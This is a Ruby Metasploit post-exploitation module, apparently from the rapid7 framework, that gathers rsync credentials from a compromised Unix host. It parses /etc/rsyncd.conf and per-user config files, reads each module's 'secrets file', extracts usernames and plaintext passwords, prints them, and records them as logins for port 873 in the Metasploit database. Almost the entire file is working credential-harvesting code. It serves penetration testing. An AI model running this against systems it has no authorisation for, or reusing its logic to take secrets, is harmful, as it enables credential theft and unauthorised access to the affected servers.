##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'UNIX Gather RSYNC Credentials',
        'Description'   => %q(
          Post Module to obtain credentials saved for RSYNC in various locations
        ),
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],
        'SessionTypes'  => %w(shell)
      )
    )

    register_options(
      [
        OptString.new('USER_CONFIG', [false, 'Attempt to get passwords from this RSYNC ' \
          'configuration file relative to each local user\'s home directory.  Leave unset to disable.', 'rsyncd.conf'])
      ]
    )
    register_advanced_options(
      [
        OptString.new('RSYNCD_CONFIG', [true, 'Path to rsyncd.conf', '/etc/rsyncd.conf'])
      ]
    )
  end

  def setup
    @user_config = datastore['USER_CONFIG'].blank? ? nil : datastore['USER_CONFIG']
  end

  def dump_rsync_secrets(config_file)
    vprint_status("Attempting to get RSYNC creds from #{config_file}")
    creds_table = Rex::Text::Table.new(
      'Header' => "RSYNC credentials from #{config_file}",
      'Columns' => %w(Username Password Module)
    )

    # read the rsync configuration file, extracting the 'secrets file'
    # directive for any rsync modules (shares) within
    rsync_config = Rex::Parser::Ini.new(config_file)
    # https://github.com/rapid7/metasploit-framework/issues/6265
    rsync_config.each_key do |rmodule|
      # XXX: Ini assumes anything on either side of the = is the key and value,
      # including spaces, so we need to fix this
      module_config = Hash[rsync_config[rmodule].map { |k, v| [ k.strip, v.strip ] }]
      next unless (secrets_file = module_config['secrets file'])
      read_file(secrets_file).split(/\n/).map do |line|
        next if line =~ /^#/
        if /^(?<user>[^:]+):(?<password>.*)$/ =~ line
          creds_table << [ user, password, rmodule ]
          report_rsync_cred(user, password, rmodule)
        end
      end
    end

    return if creds_table.rows.empty?

    print_line(creds_table.to_s)
  end

  def report_rsync_cred(user, password, rmodule)
    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      username: user,
      private_data: password,
      private_type: :password,
      realm_value: rmodule,
      # XXX: add to MDM?
      #realm_key: Metasploit::Model::Realm::Key::RSYNC_MODULE,
      workspace_id: myworkspace_id
    }
    credential_core = create_credential(credential_data)

    login_data = {
      address: session.session_host,
      # TODO: rsync is 99.9% of the time on 873/TCP, but can be configured differently with the
      # 'port' directive in the global part of the rsyncd configuration file.
      # Unfortunately, Rex::Parser::Ini does not support parsing this just yet
      port: 873,
      protocol: "tcp",
      service_name: "rsync",
      core: credential_core,
      access_level: "User",
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }
    create_credential_login(login_data)
  end

  def run
    # build up a list of rsync configuration files to read, including the
    # default location of the daemon config as well as any per-user
    # configuration files that may exist (rare)
    config_path = datastore['RSYNCD_CONFIG']
    config_files = Set.new([ config_path ])
    config_files |= enum_user_directories.map { |d| ::File.join(d, @user_config) } if @user_config
    config_files.map { |config_file| dump_rsync_secrets(config_file) }
  end
end
